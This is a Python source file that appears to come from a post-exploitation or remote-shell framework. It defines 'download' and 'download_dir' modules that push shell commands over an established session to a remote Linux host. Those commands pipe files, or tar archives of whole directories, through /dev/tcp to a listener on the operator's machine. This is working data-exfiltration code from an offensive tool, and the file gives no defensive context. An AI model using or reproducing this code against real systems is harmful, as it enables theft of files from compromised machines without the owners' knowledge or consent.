from __future__ import annotations

from pathlib import Path

from reaper.modules.blueprint import ReaperModule
from reaper.utils.tcp import get_local_ip, spawn_recv_server


class DownloadModule(ReaperModule):
    name        = "download"
    description = "Download a remote file to the local machine."
    usage       = "download <id> <remote_path> [local_path]"
    category    = "File Transfer"
    platform    = ["linux"]
    arguments   = [
        {"flags": ["remote_path"], "help": "Remote file to download"},
        {"flags": ["local_path"],  "help": "Local save path", "nargs": "?", "default": None},
    ]

    def run(self) -> None:
        remote    = self.args.remote_path
        local_dir = Path(".")
        local_name = Path(remote).name
        local      = Path(self.args.local_path) if self.args.local_path else local_dir / local_name

        local_ip = get_local_ip(self.session.addr[0])

        self.notify("info", f"Downloading {self.ui._y(remote)} → {self.ui._c(str(local))}")

        with self.spinner("Receiving data…"):
            port, collect = spawn_recv_server(timeout=30.0)
            cmd = f"cat {remote} > /dev/tcp/{local_ip}/{port}\n"
            self.session.conn.sendall(cmd.encode("utf-8"))
            data = collect()

        if not data:
            self.err("No data received. File may not exist or be empty.")
            return

        try:
            local.write_bytes(data)
        except OSError as exc:
            self.err(f"Could not write file: {exc}")
            return

        self.ok(f"Saved {self.ui._c(str(local))}  ({len(data)} bytes)")


class DownloadDirModule(ReaperModule):
    name        = "download_dir"
    description = "Download a remote directory as a tar archive."
    usage       = "download_dir <id> <remote_dir> [local_path]"
    category    = "File Transfer"
    platform    = ["linux"]
    arguments   = [
        {"flags": ["remote_dir"],  "help": "Remote directory to archive and download"},
        {"flags": ["local_path"],  "help": "Local save path (.tar.gz)", "nargs": "?", "default": None},
    ]

    def run(self) -> None:
        remote    = self.args.remote_dir.rstrip("/")
        dir_name  = Path(remote).name
        local     = Path(self.args.local_path) if self.args.local_path else Path(f"{dir_name}.tar.gz")

        local_ip = get_local_ip(self.session.addr[0])

        self.notify("info", f"Archiving {self.ui._y(remote)} → {self.ui._c(str(local))}")

        with self.spinner("Compressing and transferring…"):
            port, collect = spawn_recv_server(timeout=60.0)
            cmd = f"tar czf - {remote} 2>/dev/null > /dev/tcp/{local_ip}/{port}\n"
            self.session.conn.sendall(cmd.encode("utf-8"))
            data = collect()

        if not data:
            self.err("No data received. Directory may not exist or tar unavailable.")
            return

        try:
            local.write_bytes(data)
        except OSError as exc:
            self.err(f"Could not write archive: {exc}")
            return

        self.ok(f"Saved {self.ui._c(str(local))}  ({len(data)} bytes)")
